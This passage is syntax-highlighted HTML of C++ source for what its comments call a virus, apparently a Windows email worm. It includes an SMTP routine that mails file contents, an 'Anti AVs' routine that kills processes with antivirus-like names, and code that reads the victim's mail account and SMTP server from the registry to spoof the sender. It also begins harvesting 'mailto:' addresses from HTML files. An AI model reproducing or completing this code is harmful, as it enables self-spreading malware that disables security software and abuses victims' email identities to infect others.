</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc11">basesize</span><span class="sc10">;</span><span class="sc11">k</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">get</span><span class="sc10">(</span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,&amp;</span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\x0d\x0a--bla--\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\x0d\x0a.\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">Buf</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'4'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"QUIT\x0d\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">myBuf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">myBuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------GETPROCESSMODULE------------------------------------
</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">GetProcessModule</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwPID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwModuleID</span><span class="sc10">,</span><span class="sc0">
     </span><span class="sc11">LPMODULEENTRY32</span><span class="sc0"> </span><span class="sc11">lpMe32</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">cbMe32</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0"> 
    </span><span class="sc11">BOOL</span><span class="sc0">          </span><span class="sc11">bRet</span><span class="sc0">        </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">BOOL</span><span class="sc0">          </span><span class="sc11">bFound</span><span class="sc0">      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">HANDLE</span><span class="sc0">        </span><span class="sc11">hModuleSnap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">MODULEENTRY32</span><span class="sc0"> </span><span class="sc11">me32</span><span class="sc0">        </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0"> 
 
    </span><span class="sc11">hModuleSnap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPMODULE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dwPID</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hModuleSnap</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0"> 
 
    </span><span class="sc11">me32</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MODULEENTRY32</span><span class="sc10">);</span><span class="sc0"> 
 
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Module32First</span><span class="sc10">(</span><span class="sc11">hModuleSnap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">me32</span><span class="sc10">))</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0"> 
        </span><span class="sc5">do</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0"> 
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">me32</span><span class="sc10">.</span><span class="sc11">th32ModuleID</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">dwModuleID</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0"> 
                </span><span class="sc11">CopyMemory</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lpMe32</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">me32</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cbMe32</span><span class="sc10">);</span><span class="sc0"> 
                </span><span class="sc11">bFound</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0"> 
            </span><span class="sc10">}</span><span class="sc0"> 
        </span><span class="sc10">}</span><span class="sc0"> 
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">bFound</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Module32Next</span><span class="sc10">(</span><span class="sc11">hModuleSnap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">me32</span><span class="sc10">));</span><span class="sc0"> 
 
        </span><span class="sc11">bRet</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bFound</span><span class="sc10">;</span><span class="sc0">  
    </span><span class="sc10">}</span><span class="sc0"> 
    </span><span class="sc5">else</span><span class="sc0"> 
        </span><span class="sc11">bRet</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hModuleSnap</span><span class="sc10">);</span><span class="sc0"> 
 
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bRet</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0"> 

</span><span class="sc2">//--------------------------------------PROCESSES---------------------------------------------
</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">processes</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc2">//Various stuff with processes
</span><span class="sc10">{</span><span class="sc0"> 
    </span><span class="sc11">HANDLE</span><span class="sc0">         </span><span class="sc11">hProcessSnap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">BOOL</span><span class="sc0">           </span><span class="sc11">bRet</span><span class="sc0">      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">PROCESSENTRY32</span><span class="sc0"> </span><span class="sc11">pe32</span><span class="sc0">      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0"> 
    
    </span><span class="sc11">hProcessSnap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hProcessSnap</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc11">pe32</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">PROCESSENTRY32</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">hProcessSnap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pe32</span><span class="sc10">))</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0"> 
        </span><span class="sc11">DWORD</span><span class="sc0">         </span><span class="sc11">dwPriorityClass</span><span class="sc10">;</span><span class="sc0"> 
        </span><span class="sc11">BOOL</span><span class="sc0">          </span><span class="sc11">bGotModule</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0"> 
        </span><span class="sc11">MODULEENTRY32</span><span class="sc0"> </span><span class="sc11">me32</span><span class="sc0">       </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0"> 
        </span><span class="sc5">do</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0"> 
            </span><span class="sc11">bGotModule</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetProcessModule</span><span class="sc10">(</span><span class="sc11">pe32</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">,</span><span class="sc0"> 
                </span><span class="sc11">pe32</span><span class="sc10">.</span><span class="sc11">th32ModuleID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">me32</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MODULEENTRY32</span><span class="sc10">));</span><span class="sc0"> 
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bGotModule</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0"> 
                </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hProcess</span><span class="sc10">;</span><span class="sc0"> 
                </span><span class="sc11">hProcess</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">OpenProcess</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PROCESS_ALL_ACCESS</span><span class="sc10">,</span><span class="sc0"> 
                    </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pe32</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">);</span><span class="sc0"> 
                </span><span class="sc11">dwPriorityClass</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPriorityClass</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hProcess</span><span class="sc10">);</span><span class="sc0"> 
                </span><span class="sc2">//Get the virus' filename
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">me32</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">==</span><span class="sc11">ProcessId</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">me32</span><span class="sc10">.</span><span class="sc11">szExePath</span><span class="sc10">);</span><span class="sc0">
                                                
                </span><span class="sc2">//Anti AVs
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">me32</span><span class="sc10">.</span><span class="sc11">szModule</span><span class="sc10">,</span><span class="sc6">"AV"</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">me32</span><span class="sc10">.</span><span class="sc11">szModule</span><span class="sc10">,</span><span class="sc6">"F-"</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">me32</span><span class="sc10">.</span><span class="sc11">szModule</span><span class="sc10">,</span><span class="sc6">"av"</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">TerminateProcess</span><span class="sc10">(</span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> 
                    </span><span class="sc10">}</span><span class="sc0">
                
                </span><span class="sc2">//Close the handle
</span><span class="sc0">                </span><span class="sc11">CloseHandle</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hProcess</span><span class="sc10">);</span><span class="sc0"> 
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> 
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">hProcessSnap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pe32</span><span class="sc10">));</span><span class="sc0"> 
        </span><span class="sc11">bRet</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc10">}</span><span class="sc0"> 
    </span><span class="sc5">else</span><span class="sc0"> 
        </span><span class="sc11">bRet</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hProcessSnap</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bRet</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0"> 

</span><span class="sc2">//--------------------------------------FINDSERVER--------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">findserver</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Gets a SMTP server and user name from the registry (if possible)
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">key2</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">acc</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc11">smtp</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc11">eml</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">acclen</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">acc</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">smtplen</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">smtp</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">emllen</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">eml</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//Try getting a SMTP server from registry
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">key2</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Internet Account Manager"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc11">key2</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"Default Mail Account"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">acc</span><span class="sc10">,&amp;</span><span class="sc11">acclen</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">key2</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Internet Account Manager\\Accounts\\"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">key2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++){</span><span class="sc0">
</span><span class="sc11">key2</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">acc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">key2</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc11">key2</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"SMTP Server"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">smtp</span><span class="sc10">,&amp;</span><span class="sc11">smtplen</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smtp</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]&gt;</span><span class="sc4">44</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">smtp</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]&lt;</span><span class="sc4">123</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//if a valid serv. is found, replace the hard-coded one with
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                            </span><span class="sc2">//the new one
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smtp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">server</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">smtp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc2">//Now this is the SMTP server
</span><span class="sc0">    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">    
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">server</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//Get the e-mail
</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc11">key2</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"SMTP Email Address"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">eml</span><span class="sc10">,&amp;</span><span class="sc11">emllen</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">eml</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]&gt;</span><span class="sc4">44</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">eml</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]&lt;</span><span class="sc4">123</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//if a valid e-mail is found, replace the hard-coded one with
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                          </span><span class="sc2">//the new one
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">eml</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">eml</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc2">//Now this is the "FROM:" e-mail
</span><span class="sc0">    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//Set a new "HELO" domain
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">helo</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]=</span><span class="sc11">email</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">--;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">helo</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">strrev</span><span class="sc10">(</span><span class="sc11">helo</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//end
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------FINDMAIL----------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">findmail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc2">//Gets e-mail addresses from HTML files
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ik</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">lin</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],*</span><span class="sc11">start</span><span class="sc10">,</span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc11">fstream</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc11">ios</span><span class="sc10">::</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">get</span><span class="sc10">(</span><span class="sc11">lin</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">))</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">start</span><span class="sc10">=</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">lin</span><span class="sc10">,</span><span class="sc6">"mailto:"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">start</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
 </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">c</span><span class="sc10">++;</span><span class="sc0">
 </span><span class="sc11">ik</span><span class="sc10">=</span><span class="sc11">start</span><span class="sc10">-</span><span class="sc11">lin</span><span class="sc10">+</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc11">lin</span><span class="sc10">[</span><span class="sc11">ik</span><span class="sc10">];</span><span class="sc0">
